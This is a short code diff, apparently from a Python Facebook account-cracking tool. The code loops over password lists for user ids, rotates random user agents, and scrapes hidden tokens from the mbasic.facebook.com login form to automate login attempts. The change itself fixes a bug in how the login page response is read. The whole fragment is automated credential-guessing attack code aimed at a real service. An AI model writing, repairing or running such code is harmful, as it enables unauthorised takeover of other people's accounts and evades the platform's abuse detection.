@@ -1911,7 +1911,7 @@ def x(uid,pwx,tl):
         for ps in pwx:
             ses = requests.Session()
             pro = random.choice(uas)
-            free_fb = session.get('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl').text
+            free_fb = session.get('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl')
             log_data = {
 'm_ts': re.search('name="m_ts" value="(.*?)"',str(free_fb.text)).group(1),
 'li': re.search('name="li" value="(.*?)"',str(free_fb.text)).group(1),
